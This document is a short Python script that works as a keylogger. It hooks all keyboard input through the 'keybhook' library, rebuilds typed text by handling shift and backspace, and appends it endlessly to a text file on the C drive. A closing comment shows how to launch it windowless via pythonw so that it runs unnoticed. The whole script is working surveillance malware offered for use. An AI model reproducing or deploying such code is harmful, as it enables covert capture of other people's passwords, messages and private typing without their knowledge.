from keybhook import start_hook, config, VK_CODELETTER # pip install keybhook pandas numpy
import pandas as pd
import numpy as np
VK_CODELETTER[193] = ('?', False) # adds not mapped chars (https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes), on my keyboard "?" has the code 193 -  it might be different on yours. (2nd value: True if numpad else False)
config.done = False
oldlen = 0
co = 0
limit = 60
start_hook()
while True:
    try:
        while True:
            newlen = len(config.results)
            if newlen > oldlen:
                if config.results:
                    print(config.results[-1]) # prints the last captured letter
                co += 1

            oldlen = newlen
            if co == limit:
                break
        df=pd.DataFrame(config.results.copy())
        config.results.clear()
        config.results.insert(0,('letter', 'is_numpad', 'event_code', 'event', 'scan_code', 'flags', 'time'))
        co = 0
        df.columns = df.iloc[0].copy()
        df=df.drop(0).reset_index(drop=True)
        df['letter'] = df['letter'].astype('string')
        df=df.loc[df['event'] == 'KEY_DOWN'].reset_index(drop=True)
        shiftkeys=df.loc[df['letter'].str.contains('shift',regex=True,na=False)].index
        upletter=df.loc[shiftkeys+1].letter.str.upper()
        df.loc[upletter.index, 'letter'] = upletter
        df=df.loc[np.setdiff1d(df.index,shiftkeys)].reset_index(drop=True)
        backspace_keys = df.loc[df.letter.str.contains('backspace',na=False,regex=False)]
        gone_keys = backspace_keys.index - 1
        df=df.drop(np.concatenate([backspace_keys.index , gone_keys])).reset_index(drop=True)
        df.loc[df.letter.str.len()>1, 'letter'] = ' '
        frase=''.join(df.letter.to_list())
        output = 'c:\\testkeyloggernew3.txt'
        with open(output, mode='a', encoding='utf-8') as f:
            f.write(f'{frase}\n')
    except Exception as fe:
        print(fe)
        continue
# start "" C:\ProgramData\anaconda3\envs\dfdir\pythonw.exe C:\ProgramData\anaconda3\envs\dfdir\f.pyw